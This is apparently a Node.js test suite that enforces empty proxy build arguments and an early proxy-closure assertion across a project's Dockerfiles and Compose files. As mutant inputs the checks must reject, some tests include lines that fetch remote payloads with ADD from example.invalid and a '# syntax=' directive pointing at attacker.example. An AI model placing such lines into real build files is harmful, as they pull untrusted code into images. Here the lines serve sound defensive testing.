import assert from "node:assert/strict";
import { readFileSync, readdirSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import test from "node:test";

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const ASSERTION = join(
  ROOT,
  "deploy/compose/scripts/assert-build-proxy-closed",
);
const NAMES = [
  "HTTP_PROXY",
  "http_proxy",
  "HTTPS_PROXY",
  "https_proxy",
  "NO_PROXY",
  "no_proxy",
  "FTP_PROXY",
  "ftp_proxy",
  "ALL_PROXY",
  "all_proxy",
];
const ARG_LINES = NAMES.map((name) => `ARG ${name}`);
const DOCKERFILES = [
  "deploy/compose/gateway/Dockerfile",
  "deploy/compose/postgres/Dockerfile",
  "deploy/compose/keycloak/Dockerfile",
  "deploy/compose/proxy/Dockerfile",
  "deploy/compose/browser/Dockerfile",
  "deploy/helm/postgres/Dockerfile",
];

function dockerfilesBelow(directory, relative = "") {
  const found = [];
  for (const entry of readdirSync(directory, { withFileTypes: true })) {
    const childRelative = relative === "" ? entry.name : `${relative}/${entry.name}`;
    const child = join(directory, entry.name);
    if (entry.isDirectory()) found.push(...dockerfilesBelow(child, childRelative));
    if (entry.isFile() && entry.name === "Dockerfile") found.push(`deploy/${childRelative}`);
  }
  return found.sort();
}

function deploymentYamlBelow(directory, relative = "") {
  const found = [];
  for (const entry of readdirSync(directory, { withFileTypes: true })) {
    const childRelative = relative === "" ? entry.name : `${relative}/${entry.name}`;
    const child = join(directory, entry.name);
    if (entry.isDirectory()) found.push(...deploymentYamlBelow(child, childRelative));
    if (
      entry.isFile() &&
      /^(?:compose(?:\.[a-z0-9.-]+)?|docker-compose)\.ya?ml$/.test(entry.name)
    ) {
      const source = readFileSync(child, "utf8");
      if (
        source.split(/\r?\n/).some(
          (line) =>
            hasYamlBuildKey(line) ||
            hasNoncanonicalYamlKey(line) ||
            hasNonemptyFlowMapping(line),
        )
      ) {
        found.push({ path: `deploy/${childRelative}`, source });
      }
    }
  }
  return found.sort((left, right) => left.path.localeCompare(right.path));
}

function hasNonemptyFlowMapping(line) {
  if (line.trimStart().startsWith("#")) return false;
  const withoutExpressions = line.replace(/\$\{[^}\r\n]*\}/g, "");
  return (
    /[{}]/.test(withoutExpressions) &&
    !/^\s*[A-Za-z0-9_.-]+:\s*\{\}\s*$/.test(withoutExpressions)
  );
}

function hasNoncanonicalYamlKey(line) {
  const trimmed = line.trimStart();
  return trimmed !== "" && !trimmed.startsWith("#") && /^(?:["']|\?|!|&)/.test(trimmed);
}

function hasYamlBuildKey(line) {
  if (line.trimStart().startsWith("#")) return false;
  return /(?:^\s*|[{,]\s*)(?:(?:\?\s*)|(?:!{1,2}\S+\s+)|(?:&\S+\s+))*(?:build|["']build["'])\s*:/.test(line);
}

function buildProxyFindings(source) {
  const findings = [];
  const lines = source.split(/\r?\n/);
  const anchors = new Set();
  for (let index = 0; index < lines.length; index += 1) {
    const anchor = lines[index].match(/^x-[a-z0-9-]+:\s+&([a-z0-9-]+)$/)?.[1];
    if (anchor === undefined) continue;
    const expected = NAMES.map((name) => `  ${name}: ""`);
    if (expected.every((line, offset) => lines[index + offset + 1] === line)) {
      anchors.add(anchor);
    }
  }

  let builds = 0;
  for (let index = 0; index < lines.length; index += 1) {
    const line = lines[index];
    if (hasNonemptyFlowMapping(line)) {
      findings.push("noncanonical flow mapping");
      continue;
    }
    if (hasNoncanonicalYamlKey(line)) {
      findings.push("noncanonical mapping key");
      continue;
    }
    const build = line.match(/^(\s*)build:\s*$/);
    if (hasYamlBuildKey(line) && build === null) {
      findings.push("noncanonical build key");
      continue;
    }
    if (build === null) continue;
    builds += 1;
    const indent = build[1].length;
    const childIndent = " ".repeat(indent + 2);
    const mergeIndent = " ".repeat(indent + 4);
    const block = [];
    for (let cursor = index + 1; cursor < lines.length; cursor += 1) {
      const candidate = lines[cursor];
      if (candidate.trim() !== "" && candidate.match(/^ */)?.[0].length <= indent) break;
      block.push(candidate);
    }
    if (!block.includes(`${childIndent}context: ../..`)) {
      findings.push("build context drifted");
    }
    const dockerfile = block
      .find((candidate) => candidate.startsWith(`${childIndent}dockerfile:`))
      ?.slice(`${childIndent}dockerfile: `.length);
    if (dockerfile === undefined || !DOCKERFILES.includes(dockerfile)) {
      findings.push("guarded Dockerfile was not explicit");
    }
    const args = block.indexOf(`${childIndent}args:`);
    const merge = args < 0
      ? undefined
      : block[args + 1]?.match(
        new RegExp(`^${mergeIndent}<<: \\*([a-z0-9-]+)$`),
      )?.[1];
    if (merge === undefined || !anchors.has(merge)) {
      findings.push("build proxy closure was not exact");
    }
  }
  if (builds === 0) findings.push("no build declaration was discovered");
  return findings;
}

function runAssertion(overrides = {}) {
  return spawnSync(ASSERTION, [], {
    encoding: "utf8",
    env: {
      PATH: process.env.PATH ?? "/usr/bin:/bin",
      ...Object.fromEntries(NAMES.map((name) => [name, ""])),
      ...overrides,
    },
  });
}

function deploymentStages(source) {
  if (/^\s*#\s*(?:syntax|escape|check)\s*=/im.test(source)) return [];
  return source
    .split(/(?=^\s*FROM\s+)/gim)
    .filter((stage) => /^\s*FROM\s+/im.test(stage));
}

function hasExactProxyArgumentsBeforeFirstRun(stage, firstRun) {
  const firstRunOffset = stage.indexOf(firstRun);
  if (firstRunOffset < 0) return false;
  const instructions = stage
    .slice(0, firstRunOffset)
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter((line) => line !== "" && !line.startsWith("#"));
  return (
    instructions.length === ARG_LINES.length + 2 &&
    /^FROM(?:\s+--platform=\S+)?\s+\S+(?:\s+AS\s+\S+)?$/i.test(instructions[0]) &&
    ARG_LINES.every((line, index) => instructions[index + 1] === line) &&
    /^COPY --chmod=0555 deploy\/compose\/scripts\/assert-build-proxy-closed \/(?:usr\/local|opt\/keycloak)\/bin\/assert-build-proxy-closed$/.test(
      instructions.at(-1) ?? "",
    )
  );
}

test("the build assertion accepts only absent or empty proxy values", () => {
  const accepted = runAssertion();
  assert.equal(accepted.status, 0, accepted.stderr);
  assert.equal(accepted.stdout, "");
  assert.equal(accepted.stderr, "");

  for (const [index, name] of NAMES.entries()) {
    const missingEnvironment = Object.fromEntries(
      NAMES.filter((candidate) => candidate !== name).map((candidate) => [
        candidate,
        "",
      ]),
    );
    const missing = spawnSync(ASSERTION, [], {
      encoding: "utf8",
      env: {
        PATH: process.env.PATH ?? "/usr/bin:/bin",
        ...missingEnvironment,
      },
    });
    assert.equal(missing.status, 0, name);
    assert.equal(missing.stdout, "", name);
    assert.equal(missing.stderr, "", name);

    const sentinel = `private-build-proxy-sentinel-${index}`;
    const nonempty = runAssertion({ [name]: sentinel });
    assert.equal(nonempty.status, 78, name);
    assert.equal(nonempty.stdout, "", name);
    assert.equal(nonempty.stderr, "build proxy contract was refused\n", name);
    assert.ok(!`${nonempty.stdout}${nonempty.stderr}`.includes(sentinel), name);
  }
});

test("all fourteen deployment image stages assert proxy closure first", () => {
  assert.deepEqual(DOCKERFILES.toSorted(), dockerfilesBelow(join(ROOT, "deploy")));
  let stageCount = 0;
  for (const path of DOCKERFILES) {
    const source = readFileSync(join(ROOT, path), "utf8");
    const stages = deploymentStages(source);
    assert.ok(stages.length > 0, path);
    stageCount += stages.length;
    for (const stage of stages) {
      const firstRun = stage.match(/^\s*RUN\s+.*(?:\n(?: [^\n]*|\t[^\n]*))*/im)?.[0];
      assert.equal(
        hasExactProxyArgumentsBeforeFirstRun(stage, firstRun ?? ""),
        true,
        path,
      );
      assert.match(
        stage,
        /^COPY --chmod=0555 deploy\/compose\/scripts\/assert-build-proxy-closed \/(?:usr\/local|opt\/keycloak)\/bin\/assert-build-proxy-closed$/m,
        path,
      );
      assert.match(
        firstRun ?? "",
        /^RUN \/(?:usr\/local|opt\/keycloak)\/bin\/assert-build-proxy-closed$/,
        path,
      );
      assert.ok(
        stage.indexOf("COPY --chmod=0555 deploy/compose/scripts/assert-build-proxy-closed") <
          stage.indexOf(firstRun),
        path,
      );
    }
  }
  assert.equal(stageCount, 14);
});

test("stage mutants cannot omit, rename, default or defer the assertion", () => {
  const source = readFileSync(
    join(ROOT, "deploy/compose/proxy/Dockerfile"),
    "utf8",
  );
  const stage = deploymentStages(source)[0];
  const assertStage = (candidate) => {
    const firstRun = candidate.match(/^\s*RUN\s+.*(?:\n(?: [^\n]*|\t[^\n]*))*/im)?.[0];
    return hasExactProxyArgumentsBeforeFirstRun(candidate, firstRun ?? "") &&
      /^RUN \/(?:usr\/local|opt\/keycloak)\/bin\/assert-build-proxy-closed$/.test(
        firstRun ?? "",
      );
  };
  assert.equal(assertStage(stage), true);
  assert.equal(assertStage(stage.replace("ARG HTTP_PROXY", "ARG HTTP_PROXY_MISSING")), false);
  assert.equal(assertStage(stage.replace("ARG HTTP_PROXY", "ARG HTTP_PROXY=sentinel")), false);
  assert.equal(
    assertStage(stage.replace("ARG HTTP_PROXY\nARG http_proxy", "ARG HTTP_PROXY http_proxy")),
    false,
  );
  assert.equal(
    assertStage(
      stage.replace(
        "COPY --chmod=0555 deploy/compose/scripts/assert-build-proxy-closed",
        "ADD https://example.invalid/preflight /tmp/preflight\nCOPY --chmod=0555 deploy/compose/scripts/assert-build-proxy-closed",
      ),
    ),
    false,
  );
  assert.equal(
    assertStage(stage.replace("ARG all_proxy\n", "ARG all_proxy\nONBUILD RUN true\n")),
    false,
  );
  const hiddenStage = deploymentStages(`${source}\n  from alpine:3.23\n  run true\n`);
  assert.equal(hiddenStage.length, 2);
  const hiddenFirstRun = hiddenStage[1].match(
    /^\s*RUN\s+.*(?:\n(?: [^\n]*|\t[^\n]*))*/im,
  )?.[0];
  assert.equal(
    hasExactProxyArgumentsBeforeFirstRun(hiddenStage[1], hiddenFirstRun ?? ""),
    false,
  );
  const remoteOnlyStage = deploymentStages(
    `${source}\nFROM alpine:3.23\nADD https://example.invalid/payload /tmp/payload\n`,
  );
  assert.equal(remoteOnlyStage.length, 2);
  assert.equal(assertStage(remoteOnlyStage[1]), false);
  for (const directive of [
    "# syntax=attacker.example/frontend:latest",
    "# escape=`",
    "# check=skip=all",
  ]) assert.deepEqual(deploymentStages(`${directive}\n${source}`), []);
  assert.equal(
    assertStage(
      stage.replace(
        "RUN /usr/local/bin/assert-build-proxy-closed\n\nRUN setcap",
        "RUN setcap -r /usr/bin/caddy\nRUN /usr/local/bin/assert-build-proxy-closed\n\nRUN setcap",
      ),
    ),
    false,
  );
});

test("every deployment Compose build supplies the exact empty proxy arguments", () => {
  const files = deploymentYamlBelow(join(ROOT, "deploy"));
  assert.deepEqual(
    files.map(({ path }) => path),
    [
      "deploy/compose/compose.browser-acceptance.yaml",
      "deploy/compose/compose.db-test.yaml",
      "deploy/compose/compose.dev.yaml",
      "deploy/compose/compose.keycloak.dev.yaml",
      "deploy/compose/compose.postgres.dev.yaml",
      "deploy/compose/docker-compose.yml",
    ],
  );
  for (const { path, source } of files) {
    assert.deepEqual(buildProxyFindings(source), [], path);
  }

  const source = readFileSync(join(ROOT, "deploy/compose/compose.db-test.yaml"), "utf8");
  for (const mutant of [
    source.replace("      args:\n        <<: *synveda-build-proxy-closure\n", ""),
    source.replace('  HTTP_PROXY: ""', '  HTTP_PROXY: "private-proxy"'),
    source.replace("    build:\n", '    "build":\n'),
    source.replace("    build:\n", '    "buil\\u0064":\n'),
    source.replace("    build:\n", "    build: ../..\n"),
    source.replace("      dockerfile:", '      "dockerfile":'),
  ]) assert.notDeepEqual(buildProxyFindings(mutant), []);

  for (const hidden of [
    "  hidden: {build: {context: ../.., dockerfile: deploy/compose/postgres/Dockerfile}}",
    '  hidden: {"buil\\u0064": {context: ../.., dockerfile: deploy/compose/postgres/Dockerfile}}',
    "  hidden: { ? build : {context: ../.., dockerfile: deploy/compose/postgres/Dockerfile}}",
    "  hidden: { !!str build : {context: ../.., dockerfile: deploy/compose/postgres/Dockerfile}}",
    "  hidden:\n    build: ../..",
  ]) {
    assert.notDeepEqual(buildProxyFindings(`${source}\n${hidden}\n`), []);
  }
});
